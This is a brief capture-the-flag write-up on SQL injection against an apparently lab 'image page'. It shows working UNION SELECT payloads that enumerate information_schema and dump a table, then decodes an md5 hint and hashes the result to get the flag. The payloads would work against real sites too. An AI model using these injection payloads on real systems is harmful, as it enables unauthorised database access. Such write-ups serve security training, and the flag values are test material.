For the image page, we test a 1 OR 1=1 to see if sql injections are possible.
1 OR 1 = 1
Display each id as the page member.

As for the member page we need more information.
First the name of the table then of each column.

To get the table name:
1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() -- -
Now we know that the table is called list_images

To get all column names:
1 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database() -- -
id,url,title,comment
Now we know all colomns name let's check it.

1 UNION SELECT title,comment FROM list_images-- 

And we get:
 Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

1928e8083cf461a51303633093573c46 -> md5 -> albatroz
albatroz -> sha256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
